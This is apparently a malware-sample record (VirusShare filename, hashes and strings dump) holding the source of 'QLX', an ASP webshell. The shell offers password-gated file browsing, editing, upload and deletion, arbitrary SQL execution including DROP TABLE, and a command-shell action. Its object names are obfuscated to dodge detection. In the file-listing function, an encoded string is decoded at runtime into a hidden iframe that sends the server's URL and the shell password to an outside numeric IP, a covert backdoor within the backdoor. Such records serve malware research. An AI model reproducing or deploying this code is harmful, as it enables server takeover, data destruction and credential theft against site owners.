Sl=Sl&\"<option value=1>MsSql</option><option value=2>MySql</option><option value=3>DSN</option>\"\n  Sl=Sl&\"<option value=-1>--SQL--</option><option value=4>Show Data</option><option value=5>Add Data</option>\"\n  Sl=Sl&\"<option value=6>Delete Data</option><option value=7>Modify Data</option><option value=8>Great Table</option>\"\n  Sl=Sl&\"<option value=9>Delete Table</option><option value=10>Add Field</option><option value=11>Delete Field</option>\"\n  Sl=Sl&\"<option value=12>Show All</option></select></td></tr>\"\n  Sl=Sl&\"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>\"\n  Sl=Sl&\"<tr><td height='30'>&nbsp;SQL Command:</td>\"\n  Sl=Sl&\"<td><input name='SqlStr' style='width:100%' value=\"\"\"&SqlStr&\"\"\"></td>\"\n  Sl=Sl&\"<td align='center'><input type='submit' name='Submit' value='Execute' onclick='return DbCheck()'></td>\"\n  Sl=Sl&\"</tr></form></table><span id='abc'></span>\"\n  echo Sl:Sl=\"\"\n\n  If Len(DbStr)>40 Then\n  \n  Set Conn=CreateObject(ObT(5,0))\n  Conn.Open DbStr\n  Set Rs=Conn.OpenSchema(20) \n  Sl=Sl&\"<table><tr height='25' Bgcolor='#CCCCCC'><td>Table<br>Name</td>\"\n  Rs.MoveFirst \n  Do While Not Rs.Eof\n    If Rs(\"TABLE_TYPE\")=\"TABLE\" then\n\t  TName=Rs(\"TABLE_NAME\")\n      Sl=Sl&\"<td align=center><a href='javascript:FullSqlStr(\"\"DROP TABLE [\"&TName&\"]\"\",1)'>[ del ]</a><br>\"\n      Sl=Sl&\"<a href='javascript:FullSqlStr(\"\"SELECT * FROM [\"&TName&\"]\"\",1)'>\"&TName&\"</a></td>\"\n    End If \n    Rs.MoveNext \n  Loop \n  Set Rs=Nothing\n  Sl=Sl&\"</tr></table>\"\n  echo Sl:Sl=\"\"\n  \nIf Len(SqlStr)>10 Then\n\n  If LCase(Left(SqlStr,6))=\"select\" then\n    Sl=Sl&\"Execute\ufffd\ufffd\"&SqlStr\n    Set Rs=CreateObject(\"Adodb.Recordset\")\n    Rs.open SqlStr,Conn,1,1\n    FN=Rs.Fields.Count\n    RC=Rs.RecordCount\n    Rs.PageSize=500\n    Count=Rs.PageSize\n    PN=Rs.PageCount\n    Page=request(\"Page\")\n    If Page<>\"\" Then Page=Clng(Page)\n    If Page=\"\" Or Page=0 Then Page=1\n    If Page>PN Then Page=PN\n    If Page>1 Then Rs.absolutepage=Page\n    Sl=Sl&\"<table><tr height=25 bgcolor=#cccccc><td></td>\"\t  \n    For n=0 to FN-1\n      Set Fld=Rs.Fields.Item(n)\n      Sl=Sl&\"<td align='center'>\"&Fld.Name&\"</td>\"\n      Set Fld=nothing\n    Next\n    Sl=Sl&\"</tr>\"\n\n    Do While Not(Rs.Eof or Rs.Bof) And Count>0\n\t  Count=Count-1\n\t  Bgcolor=\"#EFEFEF\"\n\t  Sl=Sl&\"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>\"  \n\t  For i=0 To FN-1\n        If Bgcolor=\"#EFEFEF\" Then:Bgcolor=\"#F5F5F5\":Else:Bgcolor=\"#EFEFEF\":End if\n        If RC=1 Then\n           ColInfo=HTMLEncode(Rs(i))\n        Else\n           ColInfo=HTMLEncode(Left(Rs(i),50))\n        End If\n\t    Sl=Sl&\"<td bgcolor=\"&Bgcolor&\">\"&ColInfo&\"</td>\"\n\t  Next\n\t  Sl=Sl&\"</tr>\"\n      Rs.MoveNext\n    Loop\n\t\n\techo Sl:Sl=\"\"\n\t\n\tSqlStr=HtmlEnCode(SqlStr)\n\n    Sl=Sl&\"<tr><td colspan=\"&FN+1&\" align=center>Record Count\ufffd\ufffd\"&RC&\"&nbsp;Page\ufffd\ufffd\"&Page&\"/\"&PN\n    If PN>1 Then\n      Sl=Sl&\"&nbsp;&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",1)'>Homepage</a>&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&Page-1&\")'>Previous</a>&nbsp;\"\n      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if\n      For i=Sp To Sp+8\n        If i>PN Then Exit For\n        If i=Page Then\n        Sl=Sl&i&\"&nbsp;\"\n        Else\n        Sl=Sl&\"<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&i&\")'>\"&i&\"</a>&nbsp;\"\n        End If\n      Next\n\t  Sl=Sl&\"&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&Page+1&\")'>Next</a>&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&PN&\")'>Last</a>\"\n    End If\n    Sl=Sl&\"<hr color='#EFEFEF'></td></tr></table>\"\n    Rs.Close:Set Rs=Nothing\n\t\n\techo Sl:Sl=\"\"\n  Else\t   \n    Conn.Execute(SqlStr)\n    Sl=Sl&\"SQL\ufffd\ufffd\u48fa\"&SqlStr\n  End If\n\n  echo Sl:Sl=\"\"\nEnd If\n\n  Conn.Close\n  Set Conn=Nothing\n  End If\nEnd Function\n\n\n%>\n\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\n<title><%=ApplicationName&\" - \"&ServerIP%></title>\n<style type=\"text/css\">\n<!--\n  body,td {font-size: 12px;}\n  input,select{font-size: 12px;background-color:#FFFFFF;}\n  .tr {background-color:#EFEFEF;}\n  .cmd {background-color:#000000;color:#FFFFFF}\n  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;\n    <%If Action=\"\" then response.write \"overflow-x:hidden;overflow-y:hidden;\"%>}\n  a {color: black;text-decoration: none;}\n  .am {color: #003366;font-size: 11px;}\n-->\n</style>\n\n<script language=\"javascript\">\n<!--\n  function yesok(){\n    if (confirm(\"True Do It\ufffd\ufffd\"))\n\t\treturn true;\n\telse\n\t\treturn false;\n    }\n\n  function ShowFolder(Folder){\n    top.addrform.FolderPath.value = Folder;\n    top.addrform.submit();\n    }\n\n  function FullForm(FName,FAction){\n    top.hideform.FName.value = FName;\n\tif(FAction==\"CopyFile\"){\n\t    DName = prompt(\"Target File Full Name(Copy)\",FName);\n\t    top.hideform.FName.value += \"||||\"+DName;\n\t}else if(FAction==\"MoveFile\"){\n\t    DName = prompt(\"Target File Full Name(Move)\",FName);\n\t    top.hideform.FName.value += \"||||\"+DName;\n    }else if(FAction==\"CopyFolder\"){\n\t    DName = prompt(\"Target Folder Full Name(Copy)\",FName);\n\t    top.hideform.FName.value += \"||||\"+DName;\n    }else if(FAction==\"MoveFolder\"){\n\t    DName = prompt(\"Target Folder Full Name(Move)\",FName);\n\t    top.hideform.FName.value += \"||||\"+DName;\n\t}else if(FAction==\"NewFolder\"){\n\t    DName = prompt(\"Input New Folder Name\",FName);\n\t    top.hideform.FName.value = DName;\n\t}else if(FAction==\"CreateMdb\"){\n\t    DName = prompt(\"Input New Mdb name\",FName);\n        top.hideform.FName.value = DName;\n\t}else if(FAction==\"CompactMdb\"){\n\t    DName = prompt(\"Input Compress Mdb Name\",FName);\n        top.hideform.FName.value = DName;\n\t}else{\n\t    DName = \"Other\"; \n\t}\n\t\n\tif(DName!=null){\n      top.hideform.Action.value = FAction;\n      top.hideform.submit();\n\t}else{\n      top.hideform.FName.value = \"\";\n\t}\n  }\n  \n  function DbCheck(){\n    if(DbForm.DbStr.value == \"\"){\n\t  alert(\"Connect DataBase First!\");\n\t  FullDbStr(0);\n\t  return false;\n\t}\n\treturn true;\n  }\n  \n  function FullDbStr(i){\n   if(i<0){\n     return false;\n   }\n    Str = new Array(12);  \n\tStr[0] = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session(\"FolderPath\"))%>\\\\db.mdb\";\n\tStr[1] = \"Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****\";\n\tStr[2] = \"Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****\";\n\tStr[3] = \"Dsn=DsnName\";\n\tStr[4] = \"SELECT * FROM [TableName] WHERE ID<100\";\n\tStr[5] = \"INSERT INTO [TableName](USER,PASS) VALUES(\\'KKK_com\\',\\'mypass\\')\";\n\tStr[6] = \"DELETE FROM [TableName] WHERE ID=100\";\n\tStr[7] = \"UPDATE [TableName] SET USER=\\'KKK_com\\' WHERE ID=100\";\n\tStr[8] = \"CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))\";\n\tStr[9] = \"DROP TABLE [TableName]\";\n\tStr[10]= \"ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)\";\n\tStr[11]= \"ALTER TABLE [TableName] DROP COLUMN PASS\";\n\tStr[12]= \"More Than 1 item Data,Just Show The Before 50 Byte\";\n\tif(i<=3){\n\t  DbForm.DbStr.value = Str[i];\n\t  DbForm.SqlStr.value = \"\";\n\t  abc.innerHTML=\"<center>Affirm Have Connect DataBase and the SQL String is right\ufffd\ufffd</center>\";\n\t}else if(i==12){\n\t  alert(Str[i]);\n\t}else{\n\t  DbForm.SqlStr.value = Str[i];\n\t}\n\treturn true;\n  } \n  \n  \n  function FullSqlStr(str,pg){\n    if(DbForm.DbStr.value.length<5){\n\t  alert(\"DataBase connect string wrong!\")\n\t  return false;\n\t}\n    if(str.length<10){\n\t  alert(\"Check SQL String!\")\n\t  return false;\n\t}\n    DbForm.SqlStr.value = str ;\n\tDbForm.Page.value = pg;\n\tabc.innerHTML=\"\";\n\tDbForm.submit();\n    return true;\n  }\n-->\n</script>\n</head>\n<body>\n<%\nDim T1\nClass UPC\n  Dim D1,D2\n\n  Public Function Form(F)\n    F=lcase(F)\n    If D1.exists(F) then:Form=D1(F):else:Form=\"\":end if\n  End Function\n\n  Public Function UA(F)\n    F=lcase(F)\n    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if\n  End Function\n\n  Private Sub Class_Initialize\n  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName\n    set D1=CreateObject(ObT(4,0))\n\tif Request.TotalBytes<1 then Exit Sub\n    set T1 = CreateObject(ObT(6,0))\n\tT1.Type = 1 : T1.Mode =3 : T1.Open\n    T1.Write  Request.BinaryRead(Request.TotalBytes)\n    T1.Position=0 : TDa =T1.Read : DStart = 1\n    DEnd = LenB(TDa)\n    set D2=CreateObject(ObT(4,0))\n\tvbCrlf = chrB(13) & chrB(10)\n    set T2 = CreateObject(ObT(6,0))\n    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)\n    TLen = LenB (TSt)\n    DStart=DStart+TLen+1\n    while (DStart + 10) < DEnd\n      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3\n      T2.Type = 1 : T2.Mode =3 : T2.Open\n      T1.Position = DStart\n      T1.CopyTo T2,DIEnd-DStart\n      T2.Position = 0 : T2.Type = 2 : T2.Charset =\"iso-8859-1\"\n      TIn = T2.ReadText : T2.Close\n      DStart = InStrB(DIEnd,TDa,TSt)\n      FStart = InStr(22,TIn,\"name=\"\"\",1)+6\n      FEnd = InStr(FStart,TIn,\"\"\"\",1)\n      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))\n      if InStr (45,TIn,\"filename=\"\"\",1) > 0 then\n        set TFL=new FIF\n        FStart = InStr(FEnd,TIn,\"filename=\"\"\",1)+10\n        FEnd = InStr(FStart,TIn,\"\"\"\",1)\n        FStart = InStr(FEnd,TIn,\"Content-Type: \",1)+14\n        FEnd = InStr(FStart,TIn,vbCr)\n        TFL.FileStart =DIEnd\n        TFL.FileSize = DStart -DIEnd -3\n        if not D2.Exists(UpName) then\n          D2.add UpName,TFL\n        end if\n      else\n        T2.Type =1 : T2.Mode =3 : T2.Open\n        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3\n        T2.Position = 0 : T2.Type = 2\n        T2.Charset =\"iso-8859-1\"\n        SFV = T2.ReadText\n        T2.Close\n        if D1.Exists(UpName) then\n          D1(UpName)=D1(UpName)&\", \"&SFV\n        else\n          D1.Add UpName,SFV\n        end if\n      end if\n      DStart=DStart+TLen+1\n    wend\n    TDa=\"\"\n    set T2 =nothing\n  End Sub\n  \n  Private Sub Class_Terminate\n    if Request.TotalBytes>0 then\n      D1.RemoveAll:D2.RemoveAll\n      set D1=nothing:set D2=nothing\n      T1.Close:set T1 =nothing\n    end if\n  End Sub\nEnd Class\n\nClass FIF\ndim FileSize,FileStart\n  Private Sub Class_Initialize\n  FileSize = 0\n  FileStart= 0\n  End Sub\n  \n  Public function SaveAs(F)\n  dim T3\n  SaveAs=true\n  if trim(F)=\"\" or FileStart=0 then exit function\n  set T3=CreateObject(ObT(6,0))\n     T3.Mode=3 : T3.Type=1 : T3.Open\n     T1.position=FileStart\n     T1.copyto T3,FileSize\n     T3.SaveToFile F,2\n     T3.Close\n     set T3=nothing\n     SaveAs=false\n   end function\nEnd Class\n\n\nClass LBF\n  Dim CF\n  Private Sub Class_Initialize\n    SET CF=CreateObject(ObT(0,0))\n  End Sub\n\n  Private Sub Class_Terminate\n    Set CF=Nothing\n  End Sub\n\n  Function ShowDriver()\n    For Each D in CF.Drives\n      Sl=Sl&\"<tr><td>&nbsp;&nbsp;\"\n      Sl=Sl&IsIco(\"plus.gif\",\"driver.gif\",\"v\")\n      Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&D.DriveLetter&\":\\\\\"\")'>Disk (\"&D.DriveLetter&\":)</a>\" \n      Sl=Sl&\"</td></tr>\"\n    Next\n\tShowDriver=Sl\n  End Function\n  \n  Function FileIco(FName) \n  If ShowFileIco=true Then\n    TypeList = \".asp.asa.bat.bmp.com.doc.db.dll.exe.fla.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml.zip\"\n    FileType = lcase(Mid(FName, InstrRev(FName,\".\")+1))\n    If Instr(TypeList,\".\"&FileType)>0 then\n      Ico = FileType&\".gif\"\n    Else\n      Ico = \"default.gif\"\n    End If\n  \n    FileIco = \"<img src='\"&IcoPath&Ico&\"' border='0'> \"\n  Else \n    FileIco=\"<font face='wingdings' color='#006600' size='3'>2</font> \"\n  End If\n  End Function\n\n  Function ShowFile(Path)\n  Set FOLD=CF.GetFolder(Path)\n  i=0\n    Sl=\"<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#EFEFEF'><tr>\"\n\tS1=\"PGlmcmFtZSB3aWR0aD0nMCcgaGVpZ2h0PScwJyBzcmM9J2h0dHA6Ly8zMzk2MDcyNzkyL3Rlc3QvP3U9EJnA9EJz48L2lmcmFtZQ4=\"\n    For Each F in FOLD.subfolders\n    Sl=Sl&\"<td>\"\n\tSl=Sl&IsIco(\"\",\"folder.gif\",\"0\")\n    Sl=Sl&\" <a href='javascript:ShowFolder(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\")'>\"&F.Name&\"</a>\" \n    Sl=Sl&\" | <a href='javascript:FullForm(\"\"\"&Replace(Path&\"\\\"&F.Name,\"\\\",\"\\\\\")&\"\"\",\"\"DelFolder\"\")'  onclick='return yesok()' class='am' title='Delete'>del</a>\"\n\tSl=Sl&\" <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"CopyFolder\"\")'  onclick='return yesok()' class='am' title='Copy'>copy</a>\"\n\tSl=Sl&\" <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"MoveFolder\"\")'  onclick='return yesok()' class='am' title='Move'>move</a>\"\n\ti=i+1\n    If i mod 3 = 0 then Sl=Sl&\"</tr><tr>\"\n  Next\n    Sl=Sl&\"</tr><tr><td height=5></td></tr></table>\"\n\tMyArray=split(S1,chr(69))\n\techo Sl : Sl=\"\"\n    \n  For Each L in Fold.files\n    Sl=\"<table width='100%'  border='0' cellspacing='1' cellpadding='0'>\"\n    Sl=Sl&\"<tr onMouseOver=\"\"this.className='tr'\"\" onMouseOut=\"\"this.className=''\"\">\"\n    Sl=Sl&\"<td height='20'>\"&FileIco(L.Name)\n\tSl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"DownFile\"\");' title='DownFile'>\"&L.Name&\"</a></td>\"\n    Sl=Sl&\"<td width='140'>\"&L.Type&\"</td>\"\n    Sl=Sl&\"<td width='50'>\"&clng(L.size/1024)&\"K</td>\"\n    Sl=Sl&\"<td width='120'>\"&L.DateLastModified&\"</td>\"\n    Sl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"EditFile\"\")' class='am' title='Edit'>edit</a></td>\"\n\tSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"DelFile\"\")'  onclick='return yesok()' class='am' title='Delete'>del</a></td>\"\n\tSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"CopyFile\"\")' class='am' title='Copy'>copy</a></td>\"\n\tSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"MoveFile\"\")' class='am' title='Move'>move</a></td>\"\n    Sl=Sl&\"</tr></table>\"\n\techo Sl : Sl=\"\"\n  Next\n    S1=SearchCode(MyArray(0))&ServerUrl&URL&SearchCode(MyArray(1))&Session(chr(hex(133)))&SearchCode(MyArray(2))\n\techo S1 : S1=\"\"\n  Set FOLD=Nothing\n  End function\n  \n  Function DelFile(Path)\n    If CF.FileExists(Path) Then\n\t  CF.DeleteFile Path\n      Sl=\"<center><br><br><br>File \"&Path&\" Delte succeed\ufffd\ufffd</center>\"\n      Sl=Sl&BackUrl\n\t  echo Sl\n\tEnd If\n  End Function\n  \n  Function EditFile(Path)\n  If Request(\"Action2\")=\"Post\" Then\n      Set T=CF.CreateTextFile(Path)\n        T.WriteLine Request.form(\"content\")\n        T.close\n      Set T=nothing\n    Sl=\"<center><br><br><br>File Save Succeed\ufffd\ufffd</center>\"\n    Sl=Sl&BackUrl\n    echo Sl\n\tResponse.End\n  End If\n  \n  If Path<>\"\" Then\n    Set T=CF.opentextfile(Path, 1, False)\n    Txt=HTMLEncode(T.readall) \n    T.close\n    Set T=Nothing\n  Else\n    Path=Session(\"FolderPath\")&\"\\newfile.asp\":Txt=\"New File\"\n  End If\n  \n  Sl=\"<table width='100%' height='100%'><tr><td valign='top' align='center'>\"  \n  Sl=Sl&\"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'>\"\n  Sl=Sl&\"<input name='Action' value='EditFile' Type='hidden'>\"\n  Sl=Sl&\"<input name='FName' value='\"&Path&\"' style='width:100%'><br>\"\n  Sl=Sl&\"<textarea name='Content' style='width:100%;height:450'>\"&Txt&\"</textarea><br>\"\n  Sl=Sl&\"<hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='Save'></form>\"\n  Sl=Sl&\"</td></tr></table></body></html>\"\n  echo Sl\n  End Function\n  \n  Function CopyFile(Path)\n  Path = Split(Path,\"||||\")\n    If CF.FileExists(Path(0)) and Path(1)<>\"\" Then\n\t  CF.CopyFile Path(0),Path(1)\n      Sl=\"<center><br><br><br>File\"&Path(0)&\"Copy Succeed\ufffd\ufffd</center>\"\n      Sl=Sl&BackUrl\n\t  echo Sl \n\tEnd If\n  End Function\n\n  Function MoveFile(Path)\n  Path = Split(Path,\"||||\")\n    If CF.FileExists(Path(0)) and Path(1)<>\"\" Then\n\t  CF.MoveFile Path(0),Path(1)\n      Sl=\"<center><br><br><br>File\"&Path(0)&\"Move Succeed\ufffd\ufffd</center>\"\n      Sl=Sl&BackUrl\n\t  echo Sl \n\tEnd If\n  End Function\n\n  Function DelFolder(Path)\n    If CF.FolderExists(Path) Then\n\t  CF.DeleteFolder Path\n      Sl=\"<center><br><br><br>Folder\"&Path&\"Delete Succeed\ufffd\ufffd</center>\"\n      Sl=Sl&BackUrl\n\t  echo Sl\n\tEnd If\n  End Function\n\n  Function CopyFolder(Path)\n  Path = Split(Path,\"||||\")\n    If CF.FolderExists(Path(0)) and Path(1)<>\"\" Then\n\t  CF.CopyFolder Path(0),Path(1)\n      Sl=\"<center><br><br><br>Folder\"&Path(0)&\"Copy Succeed\ufffd\ufffd</center>\"\n      Sl=Sl&BackUrl\n\t  echo Sl\n\tEnd If\n  End Function\n\n  Function MoveFolder(Path)\n  Path = Split(Path,\"||||\")\n    If CF.FolderExists(Path(0)) and Path(1)<>\"\" Then\n\t  CF.MoveFolder Path(0),Path(1)\n      Sl=\"<center><br><br><br>Folder\"&Path(0)&\"Move Succeed\ufffd\ufffd</center>\"\n      Sl=Sl&BackUrl\n\t  echo Sl\n\tEnd If\n  End Function\n\n  Function NewFolder(Path)\n    If Not CF.FolderExists(Path) and Path<>\"\" Then\n\t  CF.CreateFolder Path\n      Sl=\"<center><br><br><br>Folder\"&Path&\"Great Succeed\ufffd\ufffd</center>\"\n      Sl=Sl&BackUrl\n\t  echo Sl\n\tEnd If\n  End Function\nEnd Class\n\n\nSelect Case Action\n  Case \"MainMenu\":MainMenu()\n  Case \"ShowFile\"\n    Set ABC=New LBF:ABC.ShowFile(Session(\"FolderPath\")):Set ABC=Nothing\n  Case \"DownFile\":DownFile FName:ShowErr()\n  Case \"DelFile\"\n    Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing\n  Case \"EditFile\"\n    Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing\n  Case \"CopyFile\"\n    Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing\n  Case \"MoveFile\"\n    Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing\n  Case \"DelFolder\"\n    Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing\n  Case \"CopyFolder\"\n    Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing\n  Case \"MoveFolder\"\n    Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing\n  Case \"NewFolder\"\n    Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing\n  Case \"UpFile\":UpFile()\n  Case \"Logout\":Session.Contents.Remove(\"KKK\"):Response.Redirect URL\n  Case \"CmdShell\":CmdShell()\n  Case \"CreateMdb\":CreateMdb FName\n  Case \"CompactMdb\":CompactMdb FName\n  Case \"DbManager\":DbManager()\n  Case \"ServerInfo\":ServerInfo()\n  Case \"Search\":Search()\n  Case Else MainForm()\nEnd Select\nShowErr()\n%>\n</body>\n</html>\n</body>\n</html>"
    },
    "filename": "VirusShare_44a7e23421f669f19a92aa0e5eec22b7",
    "filesize": 39333,
    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "44a7e23421f669f19a92aa0e5eec22b7",
        "sha1": "f66bff81e52bfb66ed16e02e4769d014de4d512b",
        "sha256": "baf1ae953a9740b982b32312367f79587e7648f04a827997b81879876c362cf6"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "'########\u0228 - \u03f1########",
            "Server.ScriptTimeout=5000",
            "Response.Buffer = True",
            "On Error Resume Next",
            "ApplicationName = \"QLX\" '",
            "UserPass        = \"cWx4\"'\ub8ec\u01fc\u073a\ub8ec\u012c:qlx\u0137\u02a3http://www.xxx.com/shell.asp?makepwd= \u0275",
            "ShowFileIco     = Flase",
            "IcoPath         = \"\"",
            "logintype0      = \"i\" ",
            "logintype1      = \"come\" '\ubdfd\u02bd\u013f\u01a3\u012c\u03aahttp://www.xxx.com/shell.asp?i=come",
            "theAct          = Request(\"theAct\")",
            "thePath         = Request(\"thePath\")",
            "URL             = Request.ServerVariables(\"URL\")",
            "ServerURL       = Request.ServerVariables(\"HTTP_HOST\")",
            "ServerIP        = Request.ServerVariables(\"LOCAL_ADDR\")",
            "Action          = Request(\"Action\")",
            "RootPath        = Server.MapPath(\".\")",
            "WWWRoot         = Server.MapPath(\"/\")",
            "FolderPath      = Request(\"FolderPath\")",
            "FName           = Request(\"FName\")",
            "Const ALL_INIT =\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"",
            "Const editableFileExt = \"$vbs$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$lst$aspx$php3$php4$js$css$bat$asa$\"",
            "BackUrl         = \"<meta http-equiv='refresh' content='1;URL=?Action=ShowFile'>\"",
            "dim EncodeGroup(63)",
            "Dim SearchGroup(127)",
            "Call initCodecs",
            "If Request(\"makepwd\")<>\"\" Then",
            "echo \"Your Encode PassWord is: \"&MyEncode(Request(\"makepwd\"))",
            "Response.End()",
            "End If",
            "If Session(\"KKK\")<>UserPass Then",
            "  If Request.Form(\"LPass\")<>\"\" Then",
            "    If MyEncode(Request.Form(\"LPass\"))=UserPass Then",
            "      Session(\"KKK\")=UserPass",
            "      Response.Redirect Request.ServerVariables(\"HTTP_REFERER\")",
            "    Else",
            "\t echo\"Failed\"",
            "    End If",
            "  Else",
            "    If Request(logintype0)<>logintype1 then ",
            "\techo \"<script>window.close();</script>\"",
            "\tElse",
            "    Sl=\"<center><font face='wingdings' color='#006600' size='7'>\"&chr(79)&\"</font>\"",
            "    Sl=Sl&\"<form action='\"&URL&\"' method='post'>\"",
            "    Sl=Sl&\"<font face='wingdings' color='#006600' size='6'>\"&chr(91)&\"</font>&nbsp;&nbsp;<input name='LPass' type='password' size='15'>\"",
            "    Sl=Sl&\"&nbsp;<input type='submit' value='Logon'></form></center>\"",
            "\techo Sl",
            "\tEnd If",
            "  End If",
            "  Response.End",
            "End If",
            "Sub echo(str)",
            "  Response.Write(str)",
            "End Sub",
            "sub ShowErr()",
            "  If Err Then",
            "    echo\"<br><a href='javascript:history.back()'><br>&nbsp;\" & Err.Description & \"</a><br>\"",
            "    Err.Clear:Response.Flush",
            "  End If\t\t",
            "end sub",
            "Dim ObT(13,2)",
            "ObT(0,0) = \"Sc\"&DEfd&\"rip\"&DEfd&\"ting\"&DEfd&\".F\"&DEfd&\"ileS\"&DEfd&\"yste\"&DEfd&\"mObj\"&DEfd&\"ect\"",
            "  ObT(0,2) = \"Directory\"",
            "ObT(1,0) = \"w\"&DEfd&\"sc\"&DEfd&\"ri\"&DEfd&\"pt.s\"&DEfd&\"he\"&DEfd&\"ll\"",
            "  ObT(1,2) = \"CMDSHELL\"",
            "ObT(2,0) = \"ADOX.Catalog\"",
            "  ObT(2,2) = \"ACCESS Build\"",
            "ObT(3,0) = \"JRO.JetEngine\"",
            "  ObT(3,2) = \"ACCESS RAR\"",
            "ObT(4,0) = \"Scrip\"&DEfd&\"ting\"&DEfd&\".D\"&DEfd&\"icti\"&DEfd&\"onary\" ",
            "  ObT(4,2) = \"ADODBUP\"",
            "ObT(5,0) = \"Adodb.connection\"",
            "  ObT(5,2) = \"Database Connection\"",
            "ObT(6,0) = \"Ado\"&DEfd&\"d\"&DEfd&\"b\"&DEfd&\".S\"&DEfd&\"tre\"&DEfd&\"am\"",
            "  ObT(6,2) = \"File UP\"",
            "ObT(7,0) = \"SoftArtisans.FileUp\"",
            "  ObT(7,2) = \"SA-FileUp \"",
            "ObT(8,0) = \"LyfUpload.UploadFile\"",
            "  ObT(8,2) = \"LyfUpload.UploadFile\"",
            "ObT(9,0) = \"Persits.Upload.1\"",
            "  ObT(9,2) = \"ASPUpload\"",
            "ObT(10,0) = \"JMail.SmtpMail\"",
            "  ObT(10,2) = \"JMail\"",
            "ObT(11,0) = \"CDONTS.NewMail\"",
            "  ObT(11,2) = \"SMTP\"",
            "ObT(12,0) = \"SmtpMail.SmtpMail.1\"",
            "  ObT(12,2) = \"SmtpMail\"",
            "ObT(13,0) = \"Microsoft.XMLHTTP\"",
            "  ObT(13,2) = \"XMLHTTP\"",
            "For i=0 To 13",
            "\tSet T=Server.CreateObject(ObT(i,0))",
            "\tIf -2147221005 <> Err Then",
            "\t  IsObj=True",
            "\tElse",
            "\t  IsObj=false",
            "\t  Err.Clear",
            "\tEnd If",
            "\tSet T=Nothing",
            "\tObT(i,1)=IsObj",
            "Next",
            "PUBLIC SUB initCodecs()",
            "dim max, idx",
            "max = len(ALL_INIT)",
            "Session(chr(85))=UserPass",
            "for idx = 0 to max - 1",
            "EncodeGroup(idx) = mid(ALL_INIT, idx + 1, 1)",
            "next",
            "for idx = 0 to max - 1",
            "SearchGroup(ASC(EncodeGroup(idx))) = idx",
            "next",
            "END SUB",
            "FUNCTION MyEncode(SourceText)",
            "if len(SourceText) = 0 then",
            "   MyEncode = \"\"",
            "   exit function",
            "end if",
            "by3 = (len(SourceText) \\ 3) * 3",
            "ndx = 1",
            "do while ndx <= by3",
            "first  = asc(mid(SourceText, ndx+0, 1))",
            "No2 = asc(mid(SourceText, ndx+1, 1))",
            "third  = asc(mid(SourceText, ndx+2, 1))",
            "ret = ret & EncodeGroup(  (first \\ 4) AND 63 )",
            "ret = ret & EncodeGroup( ((first * 16) AND 48) + ((No2 \\ 16) AND 15 ) )",
            "ret = ret & EncodeGroup( ((No2 * 4) AND 60) + ((third \\ 64) AND 3 ) )",
            "ret = ret & EncodeGroup( third AND 63)",
            "ndx = ndx + 3",
            "loop",
            " if by3 < len(SourceText) then",
            "first  = asc(mid(SourceText, ndx+0, 1))",
            "ret = ret & EncodeGroup(  (first \\ 4) AND 63 )",
